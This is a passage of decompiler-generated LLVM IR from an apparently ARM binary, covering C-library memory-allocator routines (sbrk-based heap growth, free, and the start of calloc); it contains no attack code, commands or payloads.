  %v2_144f4 = load i32, i32* @r8, align 4
  %v3_144f4 = add i32 %v2_144f4, %v1_144f4
  %v2_144f8 = or i32 %v3_144f4, 1
  store i32 %v2_144f8, i32* %r3.global-to-local, align 4
  %v2_144fc = load i32, i32* %r2.global-to-local, align 4
  %v3_144fc = add i32 %v2_144fc, 4
  %v4_144fc = inttoptr i32 %v3_144fc to i32*
  store i32 %v2_144f8, i32* %v4_144fc, align 4
  br label %dec_label_pc_1467c

dec_label_pc_14504:                               ; preds = %bb162, %.thread125
  %v0_14508.pr = load i32, i32* @r8, align 4
  %v0_14504 = load i32, i32* %ip.global-to-local, align 4
  %v1_14504 = add i32 %v0_14504, 864
  %v2_14504 = inttoptr i32 %v1_14504 to i32*
  %v3_14504 = load i32, i32* %v2_14504, align 4
  store i32 %v3_14504, i32* %r2.global-to-local, align 4
  %v2_14508 = icmp eq i32 %v0_14508.pr, 0
  br i1 %v2_14508, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_14504
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_14504
  %v2_14510 = urem i32 %v3_14504, 2
  store i32 %v2_14510, i32* %r3.global-to-local, align 4
  %v2_14514 = icmp eq i32 %v2_14510, 0
  br i1 %v2_14514, label %.thread43, label %dec_label_pc_1451c

dec_label_pc_1451c:                               ; preds = %.thread39
  %v0_1451c = load i32, i32* @r4, align 4
  %v1_1451c = load i32, i32* %r1.global-to-local, align 4
  %v3_1451c = icmp ult i32 %v0_1451c, %v1_1451c
  br i1 %v3_1451c, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_1451c
  %v2_14520 = and i32 %v3_14504, -2
  store i32 %v2_14520, i32* %r3.global-to-local, align 4
  store i32 %v2_14520, i32* %v2_14504, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_1451c, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %ip.global-to-local, align 4
  %v4_14530 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_14530, i32* @r7, align 4
  %v1_14534 = add i32 %v4_14530, 864
  %v2_14534 = inttoptr i32 %v1_14534 to i32*
  %v3_14534 = load i32, i32* %v2_14534, align 4
  store i32 %v3_14534, i32* %r3.global-to-local, align 4
  %v1_14538 = urem i32 %v3_14534, 2
  store i32 %v1_14538, i32* @r6, align 4
  %v2_14538 = icmp eq i32 %v1_14538, 0
  br i1 %v2_14538, label %dec_label_pc_145cc, label %dec_label_pc_14540

dec_label_pc_14540:                               ; preds = %.thread43
  %v0_14540 = load i32, i32* @r8, align 4
  %v2_14540 = icmp eq i32 %v0_14540, 0
  br i1 %v2_14540, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_14540
  %v2_14544 = add i32 %v4_14530, 872
  %v3_14544 = inttoptr i32 %v2_14544 to i32*
  %v4_14544 = load i32, i32* %v3_14544, align 4
  store i32 %v4_14544, i32* %r2.global-to-local, align 4
  %v1_14548 = load i32, i32* %r1.global-to-local, align 4
  %v2_14548 = load i32, i32* @r4, align 4
  %v3_14548 = sub i32 %v2_14548, %v1_14548
  %v3_1454c = add i32 %v3_14548, %v4_14544
  store i32 %v3_1454c, i32* %r3.global-to-local, align 4
  store i32 %v3_1454c, i32* %v3_14544, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_14540, %bb164
  %v0_14554 = load i32, i32* @r4, align 4
  %v1_14554 = urem i32 %v0_14554, 8
  store i32 %v1_14554, i32* %r3.global-to-local, align 4
  %v2_14554 = icmp eq i32 %v1_14554, 0
  br i1 %v2_14554, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_14558 = sub nsw i32 8, %v1_14554
  store i32 %v2_14558, i32* %r3.global-to-local, align 4
  %v3_1455c = add i32 %v2_14558, %v0_14554
  store i32 %v3_1455c, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_14564 = phi i32 [ 0, %.thread46 ], [ %v2_14558, %bb165 ]
  %v1_14560 = load i32, i32* @r5, align 4
  %v2_14560 = add i32 %v1_14560, %v0_14554
  store i32 %v2_14560, i32* @r6, align 4
  %v1_14564 = load i32, i32* @r8, align 4
  %v2_14564 = add i32 %v2_14560, %v0_14564
  %v2_14568 = add i32 %v2_14564, %v1_14564
  store i32 %v2_14568, i32* %r1.global-to-local, align 4
  %v1_1456c = load i32, i32* %sb.global-to-local, align 4
  %v2_1456c = add i32 %v1_1456c, %v2_14568
  %v1_14570 = load i32, i32* %fp.global-to-local, align 4
  %v2_14570 = and i32 %v1_14570, %v2_1456c
  store i32 %v2_14570, i32* %r2.global-to-local, align 4
  %v2_14574 = sub i32 0, %v2_14560
  store i32 %v2_14574, i32* %r3.global-to-local, align 4
  %v2_14578 = sub i32 %v2_14570, %v2_14560
  store i32 %v2_14578, i32* @r5, align 4
  store i32 %v2_14578, i32* %r0.global-to-local, align 4
  br i1 %v2_14554, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_14554, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_14584 = call i32 @__GI_sbrk(i32 %v2_14578)
  store i32 %v1_14584, i32* %r0.global-to-local, align 4
  %v3_14588 = icmp eq i32 %v1_14584, -1
  br i1 %v3_14588, label %dec_label_pc_14590, label %dec_label_pc_145a0

dec_label_pc_14590:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14594 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_14594, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_145f8

dec_label_pc_145a0:                               ; preds = %bb167
  %v1_145a0 = load i32, i32* @r4, align 4
  %v3_145a0 = icmp ult i32 %v1_14584, %v1_145a0
  br i1 %v3_145a0, label %dec_label_pc_145a8, label %dec_label_pc_145f8

dec_label_pc_145a8:                               ; preds = %dec_label_pc_145a0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r0.global-to-local, align 4
  %v4_145b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_145b0, i32* %r2.global-to-local, align 4
  %v1_145b4 = add i32 %v4_145b0, 864
  %v2_145b4 = inttoptr i32 %v1_145b4 to i32*
  %v3_145b4 = load i32, i32* %v2_145b4, align 4
  %v0_145b8 = load i32, i32* @r6, align 4
  store i32 %v0_145b8, i32* %r0.global-to-local, align 4
  %v1_145bc = and i32 %v3_145b4, -2
  store i32 %v1_145bc, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_145bc, i32* %v2_145b4, align 4
  br label %dec_label_pc_145f8

dec_label_pc_145cc:                               ; preds = %.thread43
  %v0_145cc = load i32, i32* %r0.global-to-local, align 4
  %v3_145cc = icmp eq i32 %v0_145cc, -1
  br i1 %v3_145cc, label %dec_label_pc_145d4, label %dec_label_pc_145f0

dec_label_pc_145d4:                               ; preds = %dec_label_pc_145cc
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_145d8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_145d8, i32* %r0.global-to-local, align 4
  %v0_145dc = load i32, i32* @r7, align 4
  %v1_145dc = add i32 %v0_145dc, 872
  %v2_145dc = inttoptr i32 %v1_145dc to i32*
  %v3_145dc = load i32, i32* %v2_145dc, align 4
  store i32 %v3_145dc, i32* %r2.global-to-local, align 4
  %v0_145e0 = load i32, i32* @r4, align 4
  %v0_145e4 = load i32, i32* @r5, align 4
  %v2_145e0 = add i32 %v3_145dc, %v1_145d8
  %v2_145e4 = sub i32 %v2_145e0, %v0_145e0
  %v2_145e8 = sub i32 %v2_145e4, %v0_145e4
  store i32 %v2_145e8, i32* %r3.global-to-local, align 4
  store i32 %v2_145e8, i32* %v2_145dc, align 4
  %v0_145f4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_145f0

dec_label_pc_145f0:                               ; preds = %dec_label_pc_145cc, %dec_label_pc_145d4
  %v0_145f4 = phi i32 [ 0, %dec_label_pc_145cc ], [ %v0_145f4.pre, %dec_label_pc_145d4 ]
  %v0_145f0 = load i32, i32* @r4, align 4
  store i32 %v0_145f0, i32* @r7, align 4
  store i32 %v0_145f4, i32* @r5, align 4
  br label %dec_label_pc_145f8

dec_label_pc_145f8:                               ; preds = %dec_label_pc_145a0, %dec_label_pc_145a8, %dec_label_pc_14590, %dec_label_pc_145f0
  %v0_145f8 = load i32, i32* %r0.global-to-local, align 4
  %v7_145f8 = icmp eq i32 %v0_145f8, -1
  br i1 %v7_145f8, label %dec_label_pc_1467c, label %dec_label_pc_14600

dec_label_pc_14600:                               ; preds = %dec_label_pc_145f8
  %v1_14600 = load i32, i32* @r5, align 4
  %v2_14600 = add i32 %v1_14600, %v0_145f8
  %v0_14604 = load i32, i32* @r7, align 4
  %v2_14604 = sub i32 %v2_14600, %v0_14604
  %v1_14608 = or i32 %v2_14604, 1
  %v2_1460c = add i32 %v0_14604, 4
  %v3_1460c = inttoptr i32 %v2_1460c to i32*
  store i32 %v1_14608, i32* %v3_1460c, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_14618 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_14618, i32* @r6, align 4
  %v1_1461c = add i32 %v4_14618, 872
  %v2_1461c = inttoptr i32 %v1_1461c to i32*
  %v3_1461c = load i32, i32* %v2_1461c, align 4
  %v0_14620 = load i32, i32* @r8, align 4
  %v2_14620 = icmp eq i32 %v0_14620, 0
  %v0_14624 = load i32, i32* @r5, align 4
  %v2_14624 = add i32 %v0_14624, %v3_1461c
  store i32 %v2_14624, i32* %r3.global-to-local, align 4
  store i32 %v2_14624, i32* %v2_1461c, align 4
  %v0_1462c = load i32, i32* @r7, align 4
  %v1_1462c = load i32, i32* @r6, align 4
  %v2_1462c = add i32 %v1_1462c, 44
  %v3_1462c = inttoptr i32 %v2_1462c to i32*
  store i32 %v0_1462c, i32* %v3_1462c, align 4
  br i1 %v2_14620, label %dec_label_pc_1467c, label %dec_label_pc_14634

dec_label_pc_14634:                               ; preds = %dec_label_pc_14600
  %v0_14638 = load i32, i32* @r8, align 4
  %v1_14638 = add i32 %v0_14638, -12
  %v1_1463c = and i32 %v1_14638, -8
  store i32 %v3_14404, i32* %ip.global-to-local, align 4
  %v2_14644 = add i32 %v1_1463c, %v3_14404
  store i32 %v2_14644, i32* %r1.global-to-local, align 4
  %v2_14648 = icmp ugt i32 %v1_1463c, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_14650 = or i32 %v1_1463c, 1
  store i32 %v1_14650, i32* %r3.global-to-local, align 4
  store i32 %v1_14650, i32* %v2_14410, align 4
  %v0_14658 = load i32, i32* %r2.global-to-local, align 4
  %v1_14658 = load i32, i32* %r1.global-to-local, align 4
  %v2_14658 = add i32 %v1_14658, 8
  %v3_14658 = inttoptr i32 %v2_14658 to i32*
  store i32 %v0_14658, i32* %v3_14658, align 4
  %v0_1465c = load i32, i32* %r2.global-to-local, align 4
  %v1_1465c = load i32, i32* %r1.global-to-local, align 4
  %v2_1465c = add i32 %v1_1465c, 4
  %v3_1465c = inttoptr i32 %v2_1465c to i32*
  store i32 %v0_1465c, i32* %v3_1465c, align 4
  br i1 %v2_14648, label %dec_label_pc_14664, label %dec_label_pc_1467c

dec_label_pc_14664:                               ; preds = %dec_label_pc_14634
  %v0_14664 = load i32, i32* @r6, align 4
  %v1_14664 = add i32 %v0_14664, 836
  %v2_14664 = inttoptr i32 %v1_14664 to i32*
  %v3_14664 = load i32, i32* %v2_14664, align 4
  store i32 %v3_14664, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1466c = load i32, i32* %ip.global-to-local, align 4
  %v1_1466c = add i32 %v0_1466c, 8
  store i32 %v1_1466c, i32* @r0, align 4
  store i32 -1, i32* %v2_14664, align 4
  %v0_14674 = call i32 @free()
  store i32 %v0_14674, i32* %r0.global-to-local, align 4
  %v0_14678 = load i32, i32* @r4, align 4
  %v1_14678 = load i32, i32* @r6, align 4
  %v2_14678 = add i32 %v1_14678, 836
  %v3_14678 = inttoptr i32 %v2_14678 to i32*
  store i32 %v0_14678, i32* %v3_14678, align 4
  br label %dec_label_pc_1467c

dec_label_pc_1467c:                               ; preds = %.thread37, %dec_label_pc_14634, %dec_label_pc_14600, %dec_label_pc_145f8, %dec_label_pc_14664
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r0.global-to-local, align 4
  %v4_14684 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_14684, i32* %lr.global-to-local, align 4
  %v1_14688 = add i32 %v4_14684, 872
  store i32 %v1_14688, i32* %r1.global-to-local, align 4
  %v1_1468c = inttoptr i32 %v1_14688 to i32*
  %v2_1468c = load i32, i32* %v1_1468c, align 4
  store i32 %v2_1468c, i32* %r1.global-to-local, align 4
  %v3_1468c = add i32 %v4_14684, 876
  %v4_1468c = inttoptr i32 %v3_1468c to i32*
  %v5_1468c = load i32, i32* %v4_1468c, align 4
  store i32 %v5_1468c, i32* %r3.global-to-local, align 4
  %v1_14694 = add i32 %v4_14684, 868
  %v2_14694 = inttoptr i32 %v1_14694 to i32*
  %v3_14694 = load i32, i32* %v2_14694, align 4
  store i32 %v3_14694, i32* %r3.global-to-local, align 4
  %v1_14698 = add i32 %v4_14684, 884
  %v2_14698 = inttoptr i32 %v1_14698 to i32*
  %v3_14698 = load i32, i32* %v2_14698, align 4
  store i32 %v3_14698, i32* %r2.global-to-local, align 4
  %v2_1469c = add i32 %v3_14694, %v2_1468c
  store i32 %v2_1469c, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_1468c, %v5_1468c
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_1467c
  store i32 %v2_1468c, i32* %v4_1468c, align 4
  %v0_146a4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_146a4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_1467c, %bb168
  %v1_146a4 = phi i32 [ %v3_14698, %dec_label_pc_1467c ], [ %v1_146a4.pre, %bb168 ]
  %v4_146a8 = phi i32 [ %v2_1469c, %dec_label_pc_1467c ], [ %v0_146a4.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_146a8, %v1_146a4
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_146a8 = load i32, i32* %lr.global-to-local, align 4
  %v6_146a8 = add i32 %v5_146a8, 884
  %v7_146a8 = inttoptr i32 %v6_146a8 to i32*
  store i32 %v4_146a8, i32* %v7_146a8, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_146ac = load i32, i32* %lr.global-to-local, align 4
  %v1_146ac = add i32 %v0_146ac, 44
  %v2_146ac = inttoptr i32 %v1_146ac to i32*
  %v3_146ac = load i32, i32* %v2_146ac, align 4
  store i32 %v3_146ac, i32* %ip.global-to-local, align 4
  %v1_146b0 = add i32 %v3_146ac, 4
  %v2_146b0 = inttoptr i32 %v1_146b0 to i32*
  %v3_146b0 = load i32, i32* %v2_146b0, align 4
  store i32 %v1_142c4, i32* %r1.global-to-local, align 4
  %v1_146b8 = and i32 %v3_146b0, -4
  store i32 %v1_146b8, i32* %r3.global-to-local, align 4
  %v3_146bc = icmp ult i32 %v1_146b8, %v1_142c4
  br i1 %v3_146bc, label %dec_label_pc_146e8, label %dec_label_pc_146c4

dec_label_pc_146c4:                               ; preds = %bb171
  %v0_146c4 = load i32, i32* @sl, align 4
  %v2_146c4 = sub i32 %v1_146b8, %v0_146c4
  %v2_146c8 = add i32 %v0_146c4, %v3_146ac
  store i32 %v2_146c8, i32* %r1.global-to-local, align 4
  %v1_146cc = or i32 %v2_146c4, 1
  store i32 %v1_146cc, i32* %r3.global-to-local, align 4
  %v1_146d0 = or i32 %v0_146c4, 1
  store i32 %v1_146d0, i32* %r2.global-to-local, align 4
  %v1_146d4 = add i32 %v3_146ac, 8
  store i32 %v1_146d4, i32* %r0.global-to-local, align 4
  store i32 %v1_146d0, i32* %v2_146b0, align 4
  %v0_146dc = load i32, i32* %r1.global-to-local, align 4
  %v1_146dc = load i32, i32* %lr.global-to-local, align 4
  %v2_146dc = add i32 %v1_146dc, 44
  %v3_146dc = inttoptr i32 %v2_146dc to i32*
  store i32 %v0_146dc, i32* %v3_146dc, align 4
  %v0_146e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_146e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_146e0 = add i32 %v1_146e0, 4
  %v3_146e0 = inttoptr i32 %v2_146e0 to i32*
  store i32 %v0_146e0, i32* %v3_146e0, align 4
  br label %dec_label_pc_14700

dec_label_pc_146e8:                               ; preds = %bb160, %bb171, %dec_label_pc_144c4
  store i32 64088, i32* %r3.global-to-local, align 4
  %v0_146ec = call i32 @__aeabi_read_tp()
  %v3_146f0 = load i16, i16* @global_var_24150.533, align 2
  %v4_146f0 = sext i16 %v3_146f0 to i32
  store i32 %v4_146f0, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_146f8 = add i32 %v4_146f0, %v0_146ec
  %v4_146f8 = inttoptr i32 %v3_146f8 to i32*
  store i32 12, i32* %v4_146f8, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14700

dec_label_pc_14700:                               ; preds = %bb154, %bb153, %dec_label_pc_146c4, %dec_label_pc_1430c, %dec_label_pc_146e8
  %v0_14700 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14700, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14704

dec_label_pc_14704:                               ; preds = %.thread4, %dec_label_pc_142d8, %.thread124, %dec_label_pc_14148, %dec_label_pc_1413c, %dec_label_pc_13fa4, %dec_label_pc_13f28, %dec_label_pc_14700
  store i32 %v2_13e48, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r2.global-to-local, align 4
  %v4_14714 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 44) to i32*), align 4
  store i32 %v4_14714, i32* @ip, align 4
  store i32 83744, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14714)
  br label %dec_label_pc_14720

dec_label_pc_14720:                               ; preds = %dec_label_pc_13e80, %dec_label_pc_14704
  %v0_14720 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14720, i32* %r0.global-to-local, align 4
  store i32 %v3_13e1c, i32* @r4, align 4
  store i32 %v6_13e1c, i32* @r5, align 4
  store i32 %v9_13e1c, i32* @r6, align 4
  store i32 %v12_13e1c, i32* @r7, align 4
  store i32 %v15_13e1c, i32* @r8, align 4
  store i32 %v18_13e1c, i32* @sb, align 4
  store i32 %v21_13e1c, i32* @sl, align 4
  store i32 %v24_13e1c, i32* @fp, align 4
  store i32 %v27_13e1c, i32* @lr, align 4
  ret i32 %v0_14720

; uselistorder directives
  uselistorder i32 %v0_146c4, { 1, 0, 2 }
  uselistorder i32 %v3_146ac, { 1, 0, 2, 3 }
  uselistorder i32 %v4_146a8, { 1, 0 }
  uselistorder i32 %v2_1468c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_14684, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1463c, { 1, 2, 0 }
  uselistorder i32 %v0_14604, { 1, 0 }
  uselistorder i32 %v0_145f8, { 1, 0 }
  uselistorder i32 %v2_145e8, { 1, 0 }
  uselistorder i32 %v2_14578, { 2, 1, 0 }
  uselistorder i32 %v2_14560, { 1, 2, 0, 3 }
  uselistorder i32 %v2_14558, { 1, 0, 2 }
  uselistorder i32 %v1_14554, { 2, 1, 0 }
  uselistorder i32 %v0_14554, { 3, 1, 2, 0 }
  uselistorder i32 %v1_14538, { 1, 0 }
  uselistorder i32 %v2_14510, { 1, 0 }
  uselistorder i32 %v3_14504, { 1, 0, 2 }
  uselistorder i32 %v2_144e4, { 1, 0, 2 }
  uselistorder i32* %v2_144dc, { 1, 0, 2 }
  uselistorder i32 %v0_144c4, { 1, 0 }
  uselistorder i32 %v6_144a0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_1448c, { 2, 1, 0 }
  uselistorder i32 %v0_14474, { 1, 0 }
  uselistorder i32 %v2_14430, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1442c, { 1, 0 }
  uselistorder i32 %v3_14404, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_143e4, { 1, 0, 2 }
  uselistorder i32 %v2_143cc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_14374, { 2, 1, 0 }
  uselistorder i32 %v6_14368, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_14344, { 2, 1, 0, 3 }
  uselistorder i32 %v3_14304, { 1, 0, 2, 3 }
  uselistorder i32 %v0_142c4, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_142bc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_142b8, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_142a4, { 1, 0 }
  uselistorder i32 %v7_14264, { 1, 0 }
  uselistorder i32 %v4_14264, { 1, 0 }
  uselistorder i32 %v0_14234, { 1, 0 }
  uselistorder i32 %v2_14208, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_1420457, { 1, 0 }
  uselistorder i32 %v1_141d0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_141b8., { 1, 2, 0 }
  uselistorder i32 %v0_141c0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_141c0, { 1, 0 }
  uselistorder i32 %v3_141a0, { 1, 0 }
  uselistorder i32 %v4_1419c, { 1, 0, 2 }
  uselistorder i32 %v1_1410c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14164, { 1, 0 }
  uselistorder i32 %v1_14148, { 1, 0 }
  uselistorder i32 %v1_13fe8, { 1, 0 }
  uselistorder i32 %v0_14128, { 2, 0, 1, 3 }
  uselistorder i32 %v3_140f0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14184.pre, { 1, 2, 0 }
  uselistorder i32 %v0_140cc, { 2, 1, 0 }
  uselistorder i32 %v3_140c0, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_13fe0, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_14088, { 1, 0 }
  uselistorder i32 %v3_1407c, { 1, 0 }
  uselistorder i32 %v0_14088, { 1, 0 }
  uselistorder i32 %v3_14060, { 0, 2, 3, 1 }
  uselistorder i32 %v2_14050, { 1, 0, 2 }
  uselistorder i32 %v3_14008, { 2, 1, 0 }
  uselistorder i32 %v0_13ff8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_13fc8, { 1, 0 }
  uselistorder i32 %v1_13f7c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_13f78, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_13f1c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_13f10, { 1, 0 }
  uselistorder i32 %v3_13ee0, { 1, 0 }
  uselistorder i32 %v0_13ed4, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_13eb4, { 0, 2, 1, 3 }
  uselistorder i1 %v7_13ea8, { 1, 0 }
  uselistorder i32 %v0_13e78, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 42, 39, 40, 41, 43, 44, 45, 46, 109, 110, 47, 48, 49, 50, 51, 52, 53, 54, 55, 60, 56, 57, 58, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 80, 88, 75, 76, 77, 78, 79, 81, 82, 83, 84, 108, 85, 86, 87, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 34, 30, 31, 0, 32, 33, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_14720, { 1, 0 }
  uselistorder label %dec_label_pc_14704, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_14700, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_146e8, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_1467c, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_145f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_145f0, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_144c4, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_143f8, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_142b0, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_14204, { 1, 0 }
  uselistorder label %dec_label_pc_1420c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_141d0, { 1, 0 }
  uselistorder label %dec_label_pc_14184, { 1, 0 }
  uselistorder label %dec_label_pc_14118, { 1, 0 }
  uselistorder label %dec_label_pc_14114, { 1, 0 }
  uselistorder label %dec_label_pc_140c0, { 1, 0 }
  uselistorder label %dec_label_pc_140ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14074, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14060, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_14734(i32 %arg1) local_unnamed_addr {
dec_label_pc_14734:
  %v0_14734 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14734, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_14734
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14734, %bb
  %v4_14750 = phi i32 [ %arg1, %dec_label_pc_14734 ], [ 0, %bb ]
  ret i32 %v4_14750

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_14754 = load i32, i32* @r4, align 4
  %v6_14754 = load i32, i32* @r5, align 4
  %v9_14754 = load i32, i32* @r6, align 4
